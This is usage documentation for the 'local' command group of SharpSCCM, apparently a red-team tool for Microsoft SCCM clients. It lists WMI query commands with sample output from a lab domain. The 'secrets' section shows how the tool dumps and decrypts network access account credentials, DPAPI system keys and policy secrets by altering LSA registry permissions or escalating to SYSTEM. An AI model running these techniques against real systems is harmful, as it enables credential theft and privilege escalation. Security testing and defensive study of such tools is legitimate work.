---
description: local documentation
title: local
---

# Using the "local" Command Group

### Description
A group of commands to interact with the local workstation/server

### Usage
```
SharpSCCM local [command] [options]

Options:
  --debug         Print debug messages for troubleshooting
  -?, -h, --help  Show help and usage information
```
### Subcommands
```
  classes                       Get a list of local WMI classes
  class-instances <wmi-class>   Get information on local WMI class instances
  class-properties <wmi-class>  Get all properties of a specified local WMI class
  client-info                   Get the client software version for the local host via WMI
  grep <string-to-find> <path>  Search a specified file for a specified string
  query <query>                 Execute a given WQL query on the local system
  naa, secrets                  Get policy secrets (e.g., network access accounts, task sequences, and collection
                                variables) stored locally in the WMI repository
  site-info                     Get the current management point and site code for the local host via WMI
  triage                        Gather information about the site from local log files
  user-sid                      Get the hex SID for the current user
```

---

# local classes
### Description
Get a list of local WMI classes

### Usage
```
SharpSCCM local classes [options]

Options:
  -n, --wmi-namespace <wmi-namespace>  The WMI namespace to query (default: "root\CCM")
  --debug                              Print debug messages for troubleshooting
  -?, -h, --help                       Show help and usage information
```
### Examples
Query the local WMI repository for a list of classes in the `root\CCM` namespace:
```
.\SharpSCCM.exe local classes

  _______ _     _ _______  ______  _____  _______ _______ _______ _______
  |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
  ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |

[+] Connecting to \\127.0.0.1\root\CCM
[+] Executing WQL query: SELECT * FROM meta_class
__AbsoluteTimerInstruction
__ACE
__AggregateEvent
<...SNIP...>
CCM_Authority
CCM_Client
CCM_ClientIdentificationInformation
CCM_ClientProvisioningConfig
CCM_ClientSecurityInformation
CCM_ClientSiteMode
CCM_ClientUpgradeStatus
CCM_FileInfoCache
CCM_InstalledComponent
CCM_InstalledProduct
CCM_NetworkProxy
CCM_PendingDeploymentStateMessage
CCM_PendingUserAffinity
CCM_SensorBookmark
CCM_SensorCache
CCM_SensorMessageQueue
CCM_Service_ComponentException
CCM_Service_Failure
CCM_SqlCE_Database
CCM_SystemBootData
CCM_SystemBootSummary
CCM_UserLogonEvents
CCM_UserState
CIM_ClassCreation
CIM_ClassDeletion
CIM_ClassIndication
CIM_ClassModification
CIM_Error
CIM_Indication
CIM_InstCreation
CIM_InstDeletion
CIM_InstIndication
CIM_InstModification
ClientInfo
MSFT_ExtendedStatus
MSFT_WmiError
SMS_Authority
SMS_Client
SMS_LocalMP
SMS_LookupMP
SMS_MaintenanceTaskRequests
SMS_MPProxyInformation
SMS_PendingReRegistrationOnSiteReAssignment
SMS_PendingSiteAssignment
SMS_SensorWmiProvider
[+] Completed execution in 00:00:00.3168148
```

---

# local class-instances
### Description
Get information on local WMI class instances

### Requirements
Permitted security roles:
  - ACLs are applied at the object class and instance level

### Usage
```
SharpSCCM local class-instances <wmi-class> [options]

Arguments:
  <wmi-class>  The WMI class to query (e.g., "SMS_Authority")

Options:
  -n, --wmi-namespace <wmi-namespace>      The WMI namespace to query (default: "root\CCM")
  -p, --properties <properties>            Specify this option for each property to query (e.g., "-p ResourceName -p
                                           UniqueUserName"
  -v, --verbose                            Display all class properties and their values
  -w, --where-condition <where-condition>  A WHERE condition to narrow the scope of data returned by the query (e.g.,
                                           "UniqueUserName='APERTURE\cave.johnson'" or "UniqueUserName LIKE
                                           '%cave.johnson%'")
  -z, --dry-run                            Display the resulting WQL query but do not connect to the specified server
                                           and execute it
  --debug                                  Print debug messages for troubleshooting
  -?, -h, --help                           Show help and usage information
```
### Examples
Query the local WMI repository `root\CCM` namespace for instances of the `SMS_Authority` class:
```
.\SharpSCCM.exe local class-instances SMS_Authority

  _______ _     _ _______  ______  _____  _______ _______ _______ _______
  |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
  ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |

[+] Connecting to \\127.0.0.1\root\CCM
[+] Executing WQL query: SELECT * FROM SMS_Authority
-----------------------------------
SMS_Authority
-----------------------------------
Capabilities: <Capabilities SchemaVersion="1.0"><Property Name="SSLState" Value="0"/></Capabilities>
CurrentManagementPoint: ATLAS.APERTURE.SCI
Index: 1
Name: SMS:PS1
PolicyOrder: 100
PolicyRequestTarget: mp:[http]MP_PolicyManager
Protocol: OS
SigningCertificate:
Version: 9078
-----------------------------------
[+] Completed execution in 00:00:00.2622928
```

---

# local class-properties
### Description
Get all properties of a specified local WMI class

### Usage
```
SharpSCCM local class-properties <wmi-class> [options]

Arguments:
  <wmi-class>  The WMI class to query (e.g., "SMS_Authority")

Options:
  -n, --wmi-namespace <wmi-namespace>  The WMI namespace to query (default: "root\CCM")
  --debug                              Print debug messages for troubleshooting
  -?, -h, --help                       Show help and usage information
```
### Examples
Query the local WMI repository `root\CCM` namespace for the properties of the `SMS_Authority` class:
```
.\SharpSCCM.exe local class-properties SMS_Authority

  _______ _     _ _______  ______  _____  _______ _______ _______ _______
  |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
  ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |

[+] Connecting to \\127.0.0.1\root\CCM
-----------------------------------
SMS_Authority
-----------------------------------
Capabilities (String)
CurrentManagementPoint (String)
Index (UInt32)
Name (String)
PolicyOrder (UInt32)
PolicyRequestTarget (String)
Protocol (String)
SigningCertificate (String)
Version (UInt32)
-----------------------------------
[+] Completed execution in 00:00:00.2710641
```

---

# local client-info
### Description
Get the client software version for the local host via WMI

### Usage
```
SharpSCCM local client-info [options]

Options:
  --debug         Print debug messages for troubleshooting
  -?, -h, --help  Show help and usage information
```
### Examples
Query the local WMI repository for client version information:
```
.\SharpSCCM.exe local client-info

  _______ _     _ _______  ______  _____  _______ _______ _______ _______
  |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
  ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |

[+] Connecting to \\127.0.0.1\root\CCM
[+] Executing WQL query: SELECT Name,Version FROM CCM_InstalledComponent WHERE Name='SmsClient'
-----------------------------------
CCM_InstalledComponent
-----------------------------------
Version: 5.00.9078.1003
-----------------------------------
[+] Completed execution in 00:00:00.2417374
```

---

# local grep
### Description
Search a specified file for a specified string

### Usage
```
SharpSCCM local grep <string-to-find> <path> [options]

Arguments:
  <string-to-find>  The string to search for
  <path>            The full path to the file (e.g., "C:\Windows\ccmsetup\Logs\ccmsetup.log

Options:
  --debug         Print debug messages for troubleshooting
  -?, -h, --help  Show help and usage information
```
### Examples
Search the `C:\Windows\ccmsetup\Logs\ccmsetup.log` file for the string "ccmsetup started":
```
.\SharpSCCM.exe local grep "ccmsetup started" C:\Windows\ccmsetup\Logs\ccmsetup.log

  _______ _     _ _______  ______  _____  _______ _______ _______ _______
  |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
  ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |

Found match in C:\Windows\ccmsetup\Logs\ccmsetup.log
  <![LOG[==========[ ccmsetup started in process 10168 ]==========]LOG]!><time="13:28:46.510+480" date="01-13-2023" component="ccmsetup" context="" type="1" thread="1456" file="ccmsetup.cpp:10632">
[+] Completed execution in 00:00:00.2644907
```

---

# local query
### Description
Execute a given WQL query on the local system

### Requirements
Permitted security roles:
  - ACLs are applied at the object class and instance level

### Usage
```
SharpSCCM local query <query> [options]

Arguments:
  <query>  The WQL query to execute

Options:
  -n, --wmi-namespace <wmi-namespace>  The WMI namespace to query (default: "root\CCM")
  --debug                              Print debug messages for troubleshooting
  -?, -h, --help                       Show help and usage information
```
### Examples
Execute the WQL query `SELECT * FROM Authority` on the local WMI repository in the `root\CCM` namespace:
```
.\SharpSCCM.exe local query "SELECT * FROM SMS_Authority"

  _______ _     _ _______  ______  _____  _______ _______ _______ _______
  |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
  ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |

[+] Connecting to \\127.0.0.1\root\CCM
[+] Executing WQL query: SELECT * FROM SMS_Authority
-----------------------------------
Capabilities: <Capabilities SchemaVersion="1.0"><Property Name="SSLState" Value="0"/></Capabilities>
CurrentManagementPoint: ATLAS.APERTURE.SCI
Index: 1
Name: SMS:PS1
PolicyOrder: 100
PolicyRequestTarget: mp:[http]MP_PolicyManager
Protocol: OS
SigningCertificate:
Version: 9078
-----------------------------------
[+] Completed execution in 00:00:00.2732909
```

---

# local naa / local secrets
### Description
Get policy secrets (e.g., network access accounts, task sequences, and collection variables) stored locally in the WMI repository
    
### Requirements
Requirements:
       - Local Administrators group membership on a client

### Usage
```
SharpSCCM local secrets [options]

Options:
  -m, --method <disk|wmi> (REQUIRED)  The method of obtaining the DPAPI-protected blobs: wmi or disk (note that the disk method can retrieve secrets
                                      that were changed or deleted
  -s, --get-system                    Escalate to SYSTEM via token duplication (default is to modify and revert the permissions on the LSA secrets
                                      registry key)
  --debug                             Print debug messages for troubleshooting
  -?, -h, --help                      Show help and usage information
```
### Examples
Get policy secrets located in the local WMI repository `OBJECTS.DATA` file (which may contain historic secrets that were deleted in the past):
```
.\SharpSCCM.exe local secrets -m disk

  _______ _     _ _______  ______  _____  _______ _______ _______ _______
  |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
  ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |

[+] Retrieving secret blobs from CIM repository

[+] Modifying permissions on registry key: SECURITY\Policy\Secrets\DPAPI_SYSTEM\CurrVal\
[+] Modifying permissions on registry key: SECURITY\Policy\PolEKList
[+] Reverting permissions on registry key: SECURITY\Policy\Secrets\DPAPI_SYSTEM\CurrVal\
[+] Reverting permissions on registry key: SECURITY\Policy\PolEKList

[+] Secret: DPAPI_SYSTEM
    full: D88A555FF23B7BD491E17C729230CF72DADCB3208E8F4FFDCDC156EAA9BA4465BD207D865B66A2DA
     m/u: D88A555FF23B7BD491E17C729230CF72DADCB320 / 8E8F4FFDCDC156EAA9BA4465BD207D865B66A2DA

[+] SYSTEM master key cache:
    {1c383f70-2563-4e97-a0fb-6818e143f5cb}:833327774AA9CD63EEC2E0D6E37CFD6CABDA79F7
    {c55faab2-20e1-4eb5-b33c-7fc7b23872de}:5793AE27A4DE24655622A29F4E2E8E0C5B553D32
    {938b5703-2810-4bf4-8ba4-73b8a50154d3}:DBB025A5023AC10053BFA63EBFD13418A921E95E
    {a7fe9bbb-4cd1-4cc5-8c88-93807408f626}:BEF8F53E7AFE01F3676FF5E2483B36F2AEB1167F

[+] Decrypting 2 network access account secrets

    NetworkAccessUsername: APERTURE\networkaccess
    NetworkAccessPassword: P@ssw0rd

    NetworkAccessUsername: APERTURE\networkaccess
    NetworkAccessPassword: P@ssw0rd

[+] Decrypting 3 other secrets

    Plaintext secret: <PolicyAction PolicyActionType="WMI-XML">
        <instance class="CCM_NetworkAccessAccount">
                <property name="SiteSettingsKey" type="19">
                        <value>
                                <![CDATA[1]]>
                        </value>
                </property>
                <property name="NetworkAccessUsername" type="8" secret="1">
                        <value>
                                <![CDATA[891300001AB010C62C5552206B4A7E3C1EFB9A02CE6C44995ED85E1F865C435A4F565916CC1325040532032D140000002E000000300000000366000000000000767FFDADBF747124E8AEA4756C063BBD6F62693394D2B9618E67A1E64580126C0F799BB7FAFC54ED265475DCDC65FE307C534D532053]]>
                        </value>
                </property>
                <property name="NetworkAccessPassword" type="8" secret="1">
                        <value>
                                <![CDATA[89130000EC0960EAB206912DEE19915706CC742ACF06703B81FC410F4EDAB3D488051C826677E9CAA0A93C7A140000001200000018000000036600000000000043621A84451F6CA42A2E3EB00D7EC8BB503AC52767BF0857E801]]>
                        </value>
                </property>
                <property name="Reserved1" type="8">
                        <value>
                        </value>
                </property>
                <property name="Reserved2" type="8">
                        <value>
                        </value>
                </property>
                <property name="Reserved3" type="8">
                        <value>
                        </value>
                </property>
        </instance>
</PolicyAction>

    Plaintext secret: <PolicyXML Version="2" Compression="zlib"><![CDATA[789CED97618FDB441086E72B48FC87908F48D7B31D27E7A06B8BE338A2E20AE502140910CA396941A477A7D6575A55FC779E79EDDC254E82743AA90564ADECF5EECCCECEBCF3EE66726C0FED8DBDB0A575ECB52DECA5BDB2DFEDC2CEEDBE752DB47B16D03FB407F6897D6CC7F604D9128DC2DEB2627DF41DCF25167CDD639B31F71B927366BA684E355EB0D3CC7ED8B34F20CD759B8F6C2CF93B8BEDC80636E759D819ED003B3DDA8CAF18DD8476C0F30CBD88AF90EF216D4E5F3037432BE4FDD7D61EDBDE447BBC99F27D856E51473925CEA97D8ECE14DBDD1AA38F1A289DB266C98ACECED99B0823E6DDDF9018631E8F2B5164FE1520EBF375468485E24F181720D0172ACFD088F88A15E1CA13F725535C73F62DEB186FA42ECFC9FF25512DC060854267E7EC09F89DDB733C9FF1AE30786ADF32DFDDB3629D13578CDD8325BE97E85D8919EBBEB8379FDA4F783CB694B529DF5FA079412BED67A22DE08FEB4FD9ED842743AB639FF14C40F41BF2D1A9B3F22B32C77AA15D3BF8F925FAA73C9D0DC966F63B78709F7717542B0EDC833B097D5C8F2B5EB80FBFD036913CDC89C17A2E0EFF311B9BBC497997D77EED93AC23FC94C81F81EE8FF4270D6C8F75165FB1CE7358888F051667F2D45767B4C7E0F635B2D2FEC4FA4BFB437B15753CD5F7459DC9EDDC5D2A579742B4D4FD708EFD17D7A7C5635ED0BBFD52FE3CC7EA578CDF8A41E55A2C217C6FEEE07BBCC6E252DC69CA76B127DCCAD22A0FFBECB8AC19C7EDE2DC8FDFF73CBE66A5DD8C39D18CEB14E250592371771CFC2E0CB92B560C0E991DA90FD01B70736430DE5B440B9819C1F814EEE7ACCAD0CB396123ACA4BA6732C603DE316DA89B2967B7447D886682B42FB9DF4F29FD84DEE786BADF32D9EC61A9AFB315D0F7B4B3BFC7C8E26B5F03ED986F8C7B1BA36A66406BCEAE9AFF761CE1C344988C8964C2D87F53426CC7584F98CFE5E9913CCD84420FCD11FA03F41DA501FEFBAFCE10BD31634764A0DF9A5C3BA442CAEFEFBE6E8D506BDC96EFE748B93DF724E571CC632117099B6AEFB13297696622FCDDFF4C08F9AE2BA4BCFF37B1FB497D9754B2F90764772EC487E2432EA6579C1E2A1F63E672DD2F3EEE836D5033D21911A19F817BA07C066240224E67AA203C9355CEDC6E8F3E56EDE1F908D149944B5FEB6767C84CAA33938A3959CD914D7687F26F7D9CDC8ADDB1E4914E75A233D997C703ED5EC5148949B94E7D80D7474229111FFBDA2115C7A2FAAC8C8441227CF29ACBEF9F6DA7E296CBBC369D8B2DDBACBA0D7FDEAFBFD17FCCDFDE07F5D7E5CD2A65B37ADA5705DD54DE873BABECBB55E643DDCD67F52F9DFFBB588D0FD4FB19F1CA7CA15BE34027B0D07F9321330B56243AE16D657E97CAFC415B97B775795B97B775795B97B775795B97B775795B97FF4FEAF2A6B49A35FB1BADC13C91]]></PolicyXML>

    Plaintext secret: APERTURE\networkaccess

[+] Completed execution in 00:00:01.9095331
```
Get policy secrets located in the local WMI repository `root\ccm\policy\Machine\ActualConfig` namespace:
```
.\SharpSCCM.exe local secrets -m wmi

  _______ _     _ _______  ______  _____  _______ _______ _______ _______
  |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
  ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |

[+] Connecting to \\127.0.0.1\root\ccm\policy\Machine\ActualConfig

[+] Retrieving network access account blobs via WMI
[+] Retrieving task sequence blobs via WMI
[+] Retrieving collection variable blobs via WMI

[+] Modifying permissions on registry key: SECURITY\Policy\Secrets\DPAPI_SYSTEM\CurrVal\
[+] Modifying permissions on registry key: SECURITY\Policy\PolEKList
[+] Reverting permissions on registry key: SECURITY\Policy\Secrets\DPAPI_SYSTEM\CurrVal\
[+] Reverting permissions on registry key: SECURITY\Policy\PolEKList

[+] Secret: DPAPI_SYSTEM
    full: D88A555FF23B7BD491E17C729230CF72DADCB3208E8F4FFDCDC156EAA9BA4465BD207D865B66A2DA
     m/u: D88A555FF23B7BD491E17C729230CF72DADCB320 / 8E8F4FFDCDC156EAA9BA4465BD207D865B66A2DA

[+] SYSTEM master key cache:
    {1c383f70-2563-4e97-a0fb-6818e143f5cb}:833327774AA9CD63EEC2E0D6E37CFD6CABDA79F7
    {c55faab2-20e1-4eb5-b33c-7fc7b23872de}:5793AE27A4DE24655622A29F4E2E8E0C5B553D32
    {938b5703-2810-4bf4-8ba4-73b8a50154d3}:DBB025A5023AC10053BFA63EBFD13418A921E95E
    {a7fe9bbb-4cd1-4cc5-8c88-93807408f626}:BEF8F53E7AFE01F3676FF5E2483B36F2AEB1167F

[+] Decrypting network access account credentials

    NetworkAccessUsername: APERTURE\networkaccess
    NetworkAccessPassword: P@ssw0rd

[+] No task sequences were found
[+] No collection variables were found

[+] Completed execution in 00:00:00.6579307
```

---

# local site-info
### Description
Get the current management point and site code for the local host via WMI

### Usage
```
SharpSCCM local site-info [options]

Options:
  --debug         Print debug messages for troubleshooting
  -?, -h, --help  Show help and usage information
```
### Examples
Query the local WMI repository `root\CCM` namespace for the current management point and site code:
```
.\SharpSCCM.exe local site-info

  _______ _     _ _______  ______  _____  _______ _______ _______ _______
  |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
  ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |

[+] Connecting to \\127.0.0.1\root\CCM
[+] Executing WQL query: SELECT Name,CurrentManagementPoint FROM SMS_Authority
-----------------------------------
SMS_Authority
-----------------------------------
CurrentManagementPoint: ATLAS.APERTURE.SCI
Name: SMS:PS1
-----------------------------------
[+] Completed execution in 00:00:00.2469080
```

---

# local triage
### Description
Gather information about the site from local log files

### Usage
```
SharpSCCM local triage [options]

Options:
  --debug         Print debug messages for troubleshooting
  -?, -h, --help  Show help and usage information


[+] Completed execution in 00:00:00.2058501
```
### Examples
Gather information about the site from local log files:
```
.\SharpSCCM.exe local triage

  _______ _     _ _______  ______  _____  _______ _______ _______ _______
  |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
  ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |

[+] Client cache contents and permissions for the current user:
    Perms      Size  Date modified          Name
      drw             1/13/2023 1:31:56 PM  C:\Windows\ccmcache
      -rw      0.0B   1/13/2023 1:32:47 PM  C:\Windows\ccmcache\skpswi.dat

[+] Searching logs for possible UNC paths:
    Found match in C:\Windows\CCM\Logs\AppEnforce.log
      \\192.168.57.130\C$
      \\192.168.57.130\C$]LOG]!
    Found match in C:\Windows\CCM\Logs\InventoryAgent-20230127-140225.log
      \\localhost\root\Microsoft\appvirt\client
      \\localhost\root\Microsoft\appvirt\client Namespace
      \\localhost\root\vm\VirtualServer
      \\localhost\root\vm\VirtualServer Namespace
      \\localhost\root\cimv2

[+] Searching logs for possible URLs:
    Found match in C:\Windows\CCM\Logs\AppEnforce-20230124-092553.log
      http://192.168.57.130/a
    Found match in C:\Windows\CCM\Logs\CcmEval-20230128-151713.log
      http://ATLAS.APERTURE.SCI
    Found match in C:\Windows\CCM\Logs\CcmEval.log
      http://ATLAS.APERTURE.SCI
    Found match in C:\Windows\CCM\Logs\CcmMessaging-20230215-042825.log
      http://ATLAS.APERTURE.SCI/CCM_Incoming/
      http://ATLAS.APERTURE.SCI:80/CCM_Incoming/
      http://ATLAS.APERTURE.SCI/ccm_system/request,
      http://ATLAS.APERTURE.SCI/ccm_system/request
    Found match in C:\Windows\CCM\Logs\CcmMessaging.log
      http://ATLAS.APERTURE.SCI/ccm_system/request,
      http://ATLAS.APERTURE.SCI/ccm_system/request
      http://ATLAS.APERTURE.SCI/ccm_system_windowsauth/request,
      http://ATLAS.APERTURE.SCI/ccm_system_windowsauth/request
      http://ATLAS.APERTURE.SCI/CCM_Incoming/
      http://ATLAS.APERTURE.SCI:80/CCM_Incoming/
    Found match in C:\Windows\CCM\Logs\CIDownloader-20230215-052515.log
      http://ATLAS.APERTURE.SCI/SMS_MP
      http://ATLAS.APERTURE.SCI:80/SMS_MP
    Found match in C:\Windows\CCM\Logs\CIDownloader.log
      http://ATLAS.APERTURE.SCI/SMS_MP
      http://ATLAS.APERTURE.SCI:80/SMS_MP
    Found match in C:\Windows\CCM\Logs\ClientLocation.log
      http://ATLAS.APERTURE.SCI
      http://ATLAS.APERTURE.SCI/SMS_MP/.sms_aut?SITESIGNCERT,
    Found match in C:\Windows\CCM\Logs\DataTransferService-20230125-160314.log
      http://ATLAS.APERTURE.SCI:80/SMS_MP
      http://ATLAS.APERTURE.SCI:80/SMS_MP/.sms_dcm?Id&DocumentId=urn
      http://ATLAS.APERTURE.SCI/SMS_MP
    Found match in C:\Windows\CCM\Logs\DataTransferService.log
      http://ATLAS.APERTURE.SCI/SMS_MP
      http://ATLAS.APERTURE.SCI:80/SMS_MP
    Found match in C:\Windows\CCM\Logs\DeltaDownload-20230128-125009.log
      http://localhost:8005
    Found match in C:\Windows\CCM\Logs\DeltaDownload.log
      http://localhost:8005
    Found match in C:\Windows\CCM\Logs\InternetProxy.log
      http://ATLAS.APERTURE.SCI/ccm_system/request
    Found match in C:\Windows\CCM\Logs\LocationServices-20230215-044950.log
      http://ATLAS.APERTURE.SCI/SMS_MP/.sms_aut?SITESIGNCERT,
    Found match in C:\Windows\CCM\Logs\LocationServices.log
      http://ATLAS.APERTURE.SCI/SMS_MP/.sms_aut?SITESIGNCERT,
      http://ATLAS.APERTURE.SCI/SMS_MP/.sms_aut?SMSTRC,
      http://ATLAS.APERTURE.SCI/SMS_MP/.sms_aut?MPLIST1&PS1,
    Found match in C:\Windows\CCM\Logs\SensorEndpoint-20230215-054300.log
      http://www.w3.org/2001/XMLSchema-instance
      http://www.w3.org/2001/XMLSchema
      http://schemas.microsoft.com/win/2004/08/events/event
    Found match in C:\Windows\CCM\Logs\SensorEndpoint.log
      http://www.w3.org/2001/XMLSchema-instance
      http://www.w3.org/2001/XMLSchema
    Found match in C:\Windows\CCM\Logs\SensorManagedProvider-20230216-163303.Log
      http://www.w3.org/2001/XMLSchema-instance
      http://www.w3.org/2001/XMLSchema

[+] Completed execution in 00:00:23.9012160
```

---

# local user-sid
### Description
Get the hex SID for the current user

### Usage
```
SharpSCCM local user-sid [options]

Options:
  --debug         Print debug messages for troubleshooting
  -?, -h, --help  Show help and usage information
```
### Examples
Get the hex SID for the current user for site database takeover:
```
.\SharpSCCM.exe local user-sid

  _______ _     _ _______  ______  _____  _______ _______ _______ _______
  |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
  ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |

[+] Current user: APERTURE\cave.johnson
[+] Active Directory SID for current user: S-1-5-21-3371398565-414029199-3966136581-1103
[+] Active Directory SID (hex): 0x010500000000000515000000A575F3C88F95AD18057166EC4F040000
[+] Completed execution in 00:00:00.1384685
```